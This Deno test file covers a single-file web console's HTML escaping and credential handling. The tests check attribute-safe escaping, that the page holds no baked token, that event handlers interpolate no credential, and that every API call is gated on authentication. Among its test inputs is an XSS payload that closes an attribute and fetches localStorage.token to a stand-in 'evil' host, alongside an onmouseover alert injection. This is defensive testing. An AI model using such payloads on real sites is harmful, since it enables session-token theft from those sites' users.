// The console's HTML escaping, and the rule that the page carries no credential.
//
// `esc` guards an XSS into the space's own origin: record-derived values (a kind name, a grant's
// `pattern` rendered as JSON inside `title="…"`) reach HTML ATTRIBUTES, so escaping `& < >` alone
// lets a value close the attribute and inject a new one. That bug was real and shipped.
//
// The console is deliberately one file with no build step, so there is no module to import. Rather
// than split it (which would trade a real architectural property for testability), the function is
// lifted out of the page source and evaluated here. The extraction fails loudly if the function is
// renamed or reshaped, which is the property that matters: this test cannot quietly stop testing
// anything.

import { assert, assertEquals } from "@std/assert";

/** Pull one top-level `function name(...) { … }` out of source text by brace balance. */
function extractFunction(source: string, name: string): string {
  const start = source.indexOf(`function ${name}(`);
  assert(start >= 0, `console no longer defines function ${name}(); update this test with it`);
  // Skip the PARAMETER LIST before looking for the body's opening brace. A default value that is
  // an object literal (`headers = {}`) otherwise reads as the body, and the extraction silently
  // returns `{}`: a test asserting on the contents of that would pass or fail for reasons having
  // nothing to do with the function.
  let paren = 0;
  let i = source.indexOf("(", start);
  for (; i < source.length; i++) {
    if (source[i] === "(") paren++;
    else if (source[i] === ")" && --paren === 0) break;
  }
  let depth = 0;
  for (let j = source.indexOf("{", i); j < source.length; j++) {
    if (source[j] === "{") depth++;
    else if (source[j] === "}" && --depth === 0) return source.slice(start, j + 1);
  }
  throw new Error(`unbalanced braces while extracting ${name}()`);
}

const html = await Deno.readTextFile(new URL("../src/ui/index.html", import.meta.url));
const esc = new Function(`${extractFunction(html, "esc")}; return esc;`)() as (s: unknown) => string;

Deno.test("console: esc escapes both quote characters, not only the markup ones", () => {
  // `"` is the one that mattered: a grant pattern is JSON, so it ALWAYS contains a double quote.
  assertEquals(esc(`a"b`), "a&quot;b");
  assertEquals(esc("a'b"), "a&#39;b");
  assertEquals(esc("<script>"), "&lt;script&gt;");
  assertEquals(esc("a&b"), "a&amp;b");
  assertEquals(esc("plain text"), "plain text");
});

Deno.test("console: a hostile value cannot break out of an attribute", () => {
  // The shape that shipped: a value ending the attribute and opening an event handler. After
  // escaping, no raw quote and no raw angle bracket survives, so there is nothing to break out of.
  const hostile = `" onerror="fetch('//evil/'+localStorage.token)" x="`;
  const escaped = esc(hostile);
  assert(!escaped.includes('"'), "no bare double quote survives");
  assert(!/[<>]/.test(escaped), "no bare angle bracket survives");
  assert(!escaped.includes("' "), "no bare single quote survives");

  // A realistic carrier: a grant pattern rendered into title="…".
  const pattern = JSON.stringify({ tag: `x" onmouseover="alert(1)` });
  assert(!esc(pattern).includes('"'));
});

Deno.test("console: esc coerces non-strings rather than throwing", () => {
  // It is called on whatever a record body holds, which is any JSON value, and a console that
  // throws while rendering shows a blank panel, not an error.
  assertEquals(esc(42), "42");
  assertEquals(esc(null), "null");
  assertEquals(esc(undefined), "undefined");
  assertEquals(esc({ a: 1 }), "[object Object]");
});

Deno.test("console: every record-derived value in the page goes through esc", () => {
  // A cheap structural check with a real failure mode behind it: the escaping bug was not that
  // `esc` was wrong everywhere, it was that ONE call site interpolated raw. Any `${…}` inside an
  // HTML attribute in a template literal must name esc.
  // Two forms are accepted, and NOT "any bare identifier": a bare `${rec.kind}` in an attribute is
  // precisely the bug, so the check must not wave through property access.
  //   - anything routed through esc(…)
  //   - a ternary whose branches are string LITERALS, which cannot carry record data whatever the
  //     condition reads
  const literalTernary = /\?\s*(["'])[^"']*\1\s*:\s*(["'])[^"']*\2\s*$/;
  const offenders: string[] = [];
  for (const m of html.matchAll(/(?:title|value|href|src|class|id)="[^"\n]*\$\{([^}]*)\}/g)) {
    const expr = m[1];
    if (!expr.includes("esc(") && !literalTernary.test(expr)) offenders.push(m[0]);
  }
  assertEquals(offenders, [], "these attribute interpolations do not escape their value");
});

Deno.test("console: the served page carries no credential", () => {
  // `GET /` is public so the console can bootstrap in `--auth required` mode, which means anything
  // baked into this page is readable by anyone who can reach the port, and a harvested operator
  // token authorizes every verb. Never inject a credential here; the console asks for one at
  // runtime and keeps it in sessionStorage.
  assert(
    !/__RADIA_[A-Z_]*TOKEN__/.test(html),
    "the page carries a token placeholder, so something on the server may substitute a credential into it",
  );
  const tokenShaped = [...html.matchAll(/\b[0-9a-f]{48}\b/g)].map((m) => m[0]);
  assertEquals(tokenShaped, [], "a credential-shaped literal is baked into the served page");
});

Deno.test("console: no event handler interpolates a credential", () => {
  // The console can now MINT a session token (the Auth tab, operator only) and offers two buttons
  // beside it. Interpolating that token into `onclick="…"` would write a live credential into the
  // DOM as executable markup, where any injection elsewhere on the page can read it back out. It is
  // held in a variable (`MINTED`) that the handlers name instead.
  //
  // This checks the credential specifically, not every handler interpolation. The three existing
  // `onclick="…('${rec.id}')"` sites carry server-assigned ULIDs and are out of scope here.
  const offenders: string[] = [];
  for (const m of html.matchAll(/\son[a-z]+="[^"\n]*\$\{([^}]*)\}/g)) {
    if (/token|credential|secret/i.test(m[1])) offenders.push(m[0]);
  }
  assertEquals(offenders, [], "an event handler attribute interpolates something token-shaped");
});

Deno.test("console: minting parses a grant list the same way the CLI does", () => {
  // `radia login human:alice --grant message:put,query` and the Auth tab's grant box must mean the
  // same thing, or the console teaches a syntax nothing else accepts.
  const parseGrants = new Function(`${extractFunction(html, "parseGrants")}; return parseGrants;`)() as (
    who: string,
    text: string,
  ) => { principal: string; kind: string; operations: string[] }[];

  assertEquals(parseGrants("human:alice", "message:put,query"), [
    { principal: "human:alice", kind: "message", operations: ["put", "query"] },
  ]);
  // Several grants, whitespace-separated. Whitespace SEPARATES grants, so it cannot also appear
  // inside one: `message:put, query` is two grants, the second of which is malformed. That is the
  // CLI's rule too (it splits argv), and matching it is the point of this test.
  assertEquals(parseGrants("human:alice", "  message:put,query   conversation:query "), [
    { principal: "human:alice", kind: "message", operations: ["put", "query"] },
    { principal: "human:alice", kind: "conversation", operations: ["query"] },
  ]);
  // Empty is legitimate: an app (the chat) may assign the session's grants itself.
  assertEquals(parseGrants("human:alice", ""), []);
  assertEquals(parseGrants("human:alice", "   "), []);

  // Malformed input throws rather than silently minting a grant on kind "" or with no operations.
  // A grant that quietly means nothing is worse than a rejected form: it looks assigned.
  for (const bad of ["message", ":put", "message:"]) {
    let threw = false;
    try { parseGrants("human:alice", bad); } catch { threw = true; }
    assert(threw, `'${bad}' should be rejected, not parsed into a grant`);
  }
});

Deno.test("console: no credential means no request, not an operator default", () => {
  // The space's open mode answers a header-less request as `human:local`, the operator. A console
  // that leaned on that held the entire control plane because nobody had typed anything: the
  // largest possible authority acquired the least visible way. The page now gates on a token in
  // EVERY mode, so the shortcut stays available to curl and is unreachable from the browser.
  assert(
    /PUBLIC_PATHS\s*=\s*new Set\(\["\/v0\/health"\]\)/.test(html),
    "the public-path allowlist is gone or widened; only /v0/health may be called unauthenticated",
  );
  // The guard must sit in `api()`, the one funnel every panel uses. A per-caller check is a check
  // somebody will forget to add to the next panel.
  const api = extractFunction(html, "api");
  assert(/AUTH_TOKEN/.test(api) && /PUBLIC_PATHS/.test(api), "api() does not gate on the token");
  assert(/return\s*\{\s*ok:\s*false,\s*status:\s*401/.test(api), "api() does not short-circuit unauthenticated calls");

  // And the gate has to actually run: a sign-in screen nothing displays is decoration.
  assert(/id="signin"/.test(html), "no sign-in panel");
  assert(/\nstart\(\);/.test(html), "the sign-in gate is never invoked at init");
});

Deno.test("console: a pasted token is verified before it is stored", () => {
  // Storing an unusable token leaves the console signed in and uniformly broken: every panel
  // reports 401 and nothing says the credential was the problem.
  const signIn = extractFunction(html, "signIn");
  const verifyAt = signIn.indexOf("/v0/health");
  const storeAt = signIn.indexOf("useToken");
  assert(verifyAt >= 0, "signIn() does not verify the token against the space");
  assert(storeAt > verifyAt, "signIn() stores the token before verifying it");
});

Deno.test("dev: --auth defaults to required", async () => {
  // The default IS the security posture for every space nobody configured. Open mode resolves a
  // header-less request to the operator, so defaulting to it meant a space started life fully open
  // and stayed there unless someone knew the flag existed. Reading the source rather than starting
  // a server: this is one literal, and the assertion should fail on the literal changing.
  const main = await Deno.readTextFile(new URL("../src/main.ts", import.meta.url));
  const m = main.match(/const authMode = flag\(args, "--auth"\) \?\? "(\w+)"/);
  assert(m, "src/main.ts no longer resolves --auth this way; update this test with it");
  assertEquals(m[1], "required", "--auth must default to required");
});
